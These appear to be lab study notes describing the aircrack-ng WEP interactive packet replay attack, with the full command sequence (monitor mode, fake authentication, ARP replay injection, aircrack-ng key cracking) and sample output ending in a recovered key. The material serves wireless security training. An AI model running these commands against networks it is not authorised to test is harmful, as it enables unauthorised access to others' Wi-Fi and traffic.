#  Interactive Packet Replay - (Attacking a Connected Client) (WEP)

This attack allows you to choose a specific packet for replaying (injecting). The attack can obtain packets to replay from two sources. The first being a live flow of packets from your wireless card. The second being from a pcap file. Standard Pcap format (Packet CAPture, associated with the libpcap library http://www.tcpdump.org), is recognized by most commercial and open-source traffic capture and analysis tools. Reading from a file is an often overlooked feature of aireplay-ng. This allows you read packets from other capture sessions or quite often, various attacks generate pcap files for easy reuse. A common use of reading a file containing a packet your created with packetforge-ng.

## Commands

* Run [setup](../../setup.md) first
* Two terminals are needed
* At least one client must be associated with the AP

```bash
# [Terminal One]
# Set interface to monitor mode
sudo airmon-ng start $ADAPTER $CHANNEL

# Start monitoring - make terminal large enough to see everything
sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG $INTERFACE

# [Terminal Two]
# Run the fake authentication attack
sudo aireplay-ng --fakeauth 0 -a $BSSID -e $SSID -h $INTERFACEMAC $INTERFACE

# Run the interactive attack against the client and wait
sudo aireplay-ng --interactive -b $BSSID -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 $INTERFACE
```
* View output. This is a candidate ARP packet to be used for injection.

```
No source MAC (-h) specified. Using the device MAC (00:C0:CA:B2:96:E3)
Read 171 packets...

        Size: 86, FromDS: 1, ToDS: 0 (WEP)

              BSSID  =  00:9F:A9:24:B9:28
          Dest. MAC  =  FF:FF:FF:FF:FF:FF
         Source MAC  =  10:9F:A9:24:B9:25

        0x0000:  0842 0000 ffff ffff ffff 009f a924 b928  .B...........$.(
        0x0010:  109f a924 b925 e0fc b18f 0500 0991 2b11  ...$.%........+.
        0x0020:  b707 3a2c 50b7 4f19 3098 3cd4 9e38 21cb  ..:,P.O.0.<..8!.
        0x0030:  559c d938 d229 04db 45d8 a4b7 85fe 6634  U..8.)..E.....f4
        0x0040:  4a7d 5996 5822 817e 2b7a 0c12 0326 0661  J}Y.X".~+z...&.a
        0x0050:  cd3e 57e8 9d1f                           .>W...

Use this packet ?

# Say yes and monitor the data ... it should be getting big.
# If not, then ctrl-c ... try another
# Keep doing until the data starts to increase
```

```bash
# Crack the WEP keister (ensure that plenty of IVs are captured beforehand)
sudo aircrack-ng -0 $PCAP
```

* Look for the suscessful output - assuming enough IVs are available

```
Reading packets, please wait...
Opening wifu-01.cap
Read 806868 packets.

   #  BSSID              ESSID                     Encryption

   1  00:9F:A9:24:B9:28  wifu                      WGot 184612 out of 180000 IVsStarting PTW attack with 184612 ivs.
                     KEY FOUND! [ 31:32:33:34:35 ] (ASCII: 12345 )
ChoosingDecrypted correctly: 100%
```

### Using an Existing AP Packet

```bash
# Use an existing AP packet file
sudo aireplay-ng --interactive -r replay_src-0613-135427.cap $INTERFACE
```

## References

* [Aircrack-ng](https://www.aircrack-ng.org/doku.php?id=aircrack-ng)
* [Airmon-ng](https://www.aircrack-ng.org/doku.php?id=airmon-ng)
* [Aireplay-ng](https://www.aircrack-ng.org/doku.php?id=aireplay-ng)
* [Airodump-ng](https://www.aircrack-ng.org/doku.php?id=airodump-ng)
* [Interactive Packet Replay](https://www.aircrack-ng.org/doku.php?id=interactive_packet_replay)

